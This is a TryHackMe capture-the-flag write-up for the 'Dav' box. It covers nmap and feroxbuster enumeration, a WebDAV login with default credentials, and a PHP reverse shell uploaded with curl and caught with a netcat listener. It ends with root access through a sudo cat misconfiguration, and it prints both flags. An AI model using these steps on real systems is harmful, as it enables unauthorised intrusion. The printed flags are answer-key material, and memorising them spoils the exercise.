---
title: "THM - # Dav"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for THM - # Dav"
categories:
  - THM
---

The given box ```Dav``` is a Linux machine 

- [TryHackMe- Dav](#tryhackme---Dav)
  - [Recon](#recon)
	  - [Nmap Scan](#nmap-scan)
 - [Enumeration](#enumeration)
	 - [Enumeration on port 80](#enumeration-on-port-80)

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/bsidesgtdav/assets/images/dav.png" />
</center>


## Recon

### Nmap Scan

Found only one open port from the scan...

```shell
# Nmap 7.92 scan initiated Thu Jul 28 19:51:50 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /root/enum-more/obsidian_vault/thm/results/10.10.214.146/scans/_quick_tcp_nmap.txt -oX /root/enum-more/obsidian_vault/thm/results/10.10.214.146/scans/xml/_quick_tcp_nmap.xml 10.10.214.146
adjust_timeouts2: packet supposedly had rtt of -356144 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -356144 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -355080 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -355080 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -96124 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -96124 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -98690 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -98690 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -201530 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -201530 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -201445 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -201445 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -201263 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -201263 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -204086 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -204086 microseconds.  Ignoring time.
Nmap scan report for 10.10.214.146
Host is up, received user-set (0.17s latency).
Scanned at 2022-07-28 19:51:51 IST for 19s
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.10 - 3.13 (94%), Linux 5.4 (94%), Crestron XPanel control system (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Sony Android TV (Android 5.0) (90%), Android 5.0 - 6.0.1 (Linux 3.4) (90%), Android 5.1 (90%), Android 7.1.1 - 7.1.2 (90%), Linux 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=7/28%OT=80%CT=1%CU=%PV=Y%DS=2%DC=T%G=N%TM=62E29B92%P=aarch64-unknown-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10A%TI=Z%TS=8)
SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%TG=40%W=6903%O=M505NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 198.839 days (since Mon Jan 10 23:44:16 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   156.00 ms 10.11.0.1
2   198.88 ms 10.10.214.146

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 28 19:52:10 2022 -- 1 IP address (1 host up) scanned in 19.73 seconds
```

## Enumeration

### Enumeration on port 80

Using ```feroxbuster``` tool got these findings

```shell
200      GET      375l      968w    11321c http://10.10.214.146/
401      GET       14l       54w      460c http://10.10.214.146/webdav
403      GET       11l       32w      301c http://10.10.214.146/server-status
```

Searched in the google for default credentials for webdav and got this and it worked!!!

http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/bsidesgtdav/assets/images/default_cred.png" />
</center>

## Post Exploitation

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/bsidesgtdav/assets/images/webdav.png" />
</center>

Uploading a reverse shell to server to receive the shell back so, I have uploaded ```php-reverse-shell.php``` file to the server using ```curl``` command

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/LINUX/bsidesgtdav/results/10.10.214.146/loot# curl --user "wampp:xampp" http://10.10.214.146/webdav/ --upload-file ~/enum-more/obsidian_vault/thm/LINUX/bsidesgtdav/results/10.10.214.146/exploit/rev.php -v
*   Trying 10.10.214.146:80...
* Connected to 10.10.214.146 (10.10.214.146) port 80 (#0)
* Server auth using Basic with user 'wampp'
> PUT /webdav/rev.php HTTP/1.1
> Host: 10.10.214.146
> Authorization: Basic d2FtcHA6eGFtcHA=
> User-Agent: curl/7.83.1
> Accept: */*
> Content-Length: 5493
> Expect: 100-continue
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 100 Continue
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 201 Created
< Date: Thu, 28 Jul 2022 15:17:17 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Location: http://10.10.214.146/webdav/rev.php
< Content-Length: 268
< Content-Type: text/html; charset=ISO-8859-1
<
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/rev.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.214.146 Port 80</address>
</body></html>
* Connection #0 to host 10.10.214.146 left intact
```

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/bsidesgtdav/assets/images/revshell.png" />
</center>

Got the connection back successfully!!!

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/LINUX/bsidesgtdav/results/10.10.214.146/loot# rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.11.77.75] from (UNKNOWN) [10.10.214.146] 50432
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 08:17:58 up 57 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
cd /home
cd /home
ls
ls
merlin  wampp
cd merlin
cd merlin
ls
ls
user.txt
cat user.txt
cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
```

## Privilege Escalation

Next step is privilege escalation, tried with ```sudo -l``` command and got the desired output where it seems to be vulnerable

```
sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
sudo /bin/cat /root/root.txt
sudo /bin/cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```

## Conclusion

```shell
user flag -> 449b40fe93f78a938523b7e4dcd66d2a
root flag -> 101101ddc16b0cdf65ba0b8a7af7afa5
```